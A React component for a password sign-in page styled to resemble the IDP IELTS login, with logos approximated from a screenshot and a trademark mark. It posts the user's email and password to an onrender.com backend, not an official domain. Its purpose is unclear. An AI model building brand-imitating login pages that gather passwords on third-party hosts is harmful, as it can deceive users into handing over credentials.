import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { EyeIcon, EyeOffIcon, ArrowLeft } from 'lucide-react';

export default function PasswordPage() {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const email = localStorage.getItem('email');

  const handleLogin = async () => {
    setLoading(true); // Start loading animation

    try {
      const res = await fetch('https://ieltsbackend-r6p1.onrender.com/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await res.json();

      if (data.success) {
        localStorage.setItem('name', data.name);
        navigate('/dashboard');
      } else {
        // Using a custom alert for better UX than browser's default alert()
        alert('Invalid credentials'); // Keeping alert for now as per previous instructions
      }
    } catch (error) {
      console.error("Login failed:", error);
      alert('An error occurred during login. Please try again.'); // Keeping alert for now
    } finally {
      setLoading(false); // Stop loading animation regardless of success or failure
    }
  };

  const handleBack = () => {
    navigate(-1); // Go back to the previous page
  };

  return (
    <div className="min-h-screen bg-white font-sans antialiased relative overflow-hidden"> {/* Added overflow-hidden to prevent scrollbar during blur */}
      {/* Main content container - this entire div will be blurred */}
      <div className={`relative z-10 ${loading ? 'filter blur-sm pointer-events-none' : ''} transition-all duration-300 ease-in-out h-full`}>
        {/* Topmost thin red bar */}
        <div className="absolute top-0 left-0 w-full h-[7px] bg-[#E20000] z-30" />

        {/* Large Curved Red Background Shape (Behind the header) */}
        <div
          className="absolute top-0 left-0 w-[300px] h-[100px] bg-gradient-to-br from-[#E20000] to-[#C00000] transform -skew-x-[15deg] origin-top-left -translate-x-[10%] -translate-y-[5%] rounded-br-[70px] z-10"
          style={{
            backgroundPosition: 'left top',
            filter: 'drop-shadow(0 0 5px rgba(226, 0, 68, 0.88))'
          }}
        />

        {/* Main Header/Navbar Card */}
        <header className="fixed top-[7px] left-0 w-full bg-white transition-shadow duration-200 z-50 shadow-sm">
          <div className="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 py-3 flex justify-between items-center relative">
            {/* Logo - Updated SVG to resemble idp IELTS from pipl.JPG */}
            <div className="flex items-center">
              {/* IDP Logo - approximation based on pipl.JPG */}
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="mr-2">
                <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM11 17H9V12H7V17H5V7H11V17ZM19 17H17V12H15V17H13V7H19V17Z" fill="#2DB771"/>
                <circle cx="12" cy="7" r="2" fill="#2DB771"/>
              </svg>

              {/* IELTS Logo (now red) - This will be replaced by your provided SVG */}
              <svg
                width="70"
                height="24"
                viewBox="0 0 70 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                className="mr-6"
              >
                <path
                  d="M5.4 0H0V24H5.4V0ZM18.5 0H13.1V24H18.5V0ZM23.9 0H29.3V24H23.9V0ZM36.9 0L31.5 24H36.9L42.3 0H36.9ZM44.7 0H50.1V24H44.7V0ZM55.5 0H60.9V24H55.5V0Z"
                  fill="#E20000"
                />
                <text x="61.5" y="10" fontSize="8" fill="#E20000" fontWeight="bold">®</text>
              </svg>
            </div>
          </div>
        </header>

        {/* Placeholder to push content down below the fixed header */}
        <div className="pt-[70px]"></div>

        {/* Main Content Area - White card with specific login elements */}
        <div className="max-w-md mx-auto bg-white mt-16 shadow-lg rounded-lg relative overflow-hidden px-8 py-10 sm:px-12 sm:py-14">
          {/* Subtle Radial Background Pattern */}
          <div
            className="absolute inset-0 bg-no-repeat pointer-events-none z-0"
            style={{
              backgroundImage: `url("data:image/svg+xml,%3Csvg width='700' height='700' viewBox='0 0 700 700' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='350' cy='350' r='340' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='300' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='260' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='220' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='180' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='140' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='100' stroke='%23E8E8E8' stroke-width='1'/%3E%3C/svg%3E")`,
              backgroundSize: '700px',
              backgroundPosition: '-180px 100px',
              opacity: 0.35,
            }}
          />

          <div className="relative z-10">
            <button
              onClick={handleBack}
              className="flex items-center text-blue-600 hover:text-blue-800 text-sm font-semibold mb-6"
            >
              <ArrowLeft className="w-4 h-4 mr-1" /> Back
            </button>

            <h2 className="text-2xl font-bold text-gray-800 mb-6">Welcome back</h2>
            <p className="text-gray-600 text-base mb-6">
              Please enter your password to sign in
            </p>

            <div className="relative mb-4">
              <input
                type={showPassword ? 'text' : 'password'}
                className="w-full p-3 pr-10 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={(e) => {
                  if (e.key === 'Enter') {
                    handleLogin();
                  }
                }}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-500"
              >
                {showPassword ? <EyeOffIcon className="h-5 w-5" /> : <EyeIcon className="h-5 w-5" />}
              </button>
            </div>

            <a href="#" className="text-blue-600 text-sm font-semibold hover:underline block text-right mb-6">
              Forgot password?
            </a>

            <button
              onClick={handleLogin}
              className="w-full bg-[#E20000] text-white py-3 rounded-md font-semibold text-lg hover:bg-[#c00000] transition-colors duration-200"
              disabled={loading}
            >
              Sign in
            </button>
          </div>
        </div>
      </div>

      {/* Loading Overlay with Spinner */}
      {loading && (
        <div className="fixed inset-0  bg-opacity-50 flex items-center justify-center z-50">
          <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-[#E20000]"></div>
        </div>
      )}
    </div>
  );
}
